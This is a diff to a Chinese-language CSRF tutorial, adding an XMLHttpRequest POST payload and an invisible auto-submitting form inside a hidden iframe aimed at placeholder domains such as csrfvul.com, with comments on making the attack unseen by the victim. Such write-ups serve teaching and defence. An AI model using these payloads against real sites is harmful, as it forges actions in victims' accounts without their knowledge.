@@ -151,7 +151,18 @@ Accept-Language: zh-CN,zh;q=0.9
 
 所以,这种利用`XMLHttpRequest`的CSRF方法,通常仅适用于【同域】下利用CSRF.
 
-#### 【危害4】利用可控的第三方域 实现CSRF发出POST请求
+#### 【危害4】利用`XMLHttpRequest` 发出POST请求 完成CSRF攻击
+
+```javascript
+<script>
+var xh=new XMLHttpRequest(); // code for IE7+, Firefox, Chrome, Opera, Safari
+xh.open("POST","https://post.x-www-form-urlencoded.csrfvul.com/search");
+xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xh.send("username=abcd&status=on");
+</script>
+```
+
+#### 【危害5】利用`form`标签 发出POST请求 完成CSRF攻击
 
 * 场景
   * 目标域`csrfvul.com`存在CSRF漏洞
@@ -177,15 +188,19 @@ Accept-Language: zh-CN,zh;q=0.9
 Content-Type: application/x-www-form-urlencoded
 -->
 
-<iframe style="display:none" name="csrf-frame1"></iframe>
-<iframe style="display:none" name="csrf-frame1"></iframe>
-<form method='POST' action='https://post.x-www-form-urlencoded.csrfvul.com/search' target="csrf-frame1" id="csrf-form">
+<iframe style="display:none" name="csrf-frame1" src=https://payload.com></iframe>
+
+<html>
+<body>
+    <form method='POST' action='https://post.x-www-form-urlencoded.csrfvul.com/search' target="csrf-frame1" id="csrf-form">
       <input type="hidden" name="ip" value="1&#46;1&#46;1&#46;1" />
       <input type="hidden" name="offset" value="0" />
       <input type="hidden" name="limit" value="20" />
-      <input type="submit" value="send Request" /> <!--建议去掉这一行 即去掉可见的按钮 通过JavaScript实现自动提交form 这样CSRF攻击过程实现了"不可见" 并且POST请求正常发出 -->
+      <!-- <input type="submit" value="send Request" />--> <!--建议去掉这一行 即去掉可见的按钮 通过JavaScript实现自动提交form 这样CSRF攻击过程实现了"不可见" 并且POST请求正常发出 -->
     </form>
 <script>document.getElementById("csrf-form").submit()</script>
+</body>
+</html>
 ```
 
 victim访问 `https://3.com/demo` 则会发出POST请求到`https://post.x-www-form-urlencoded.csrfvul.com`
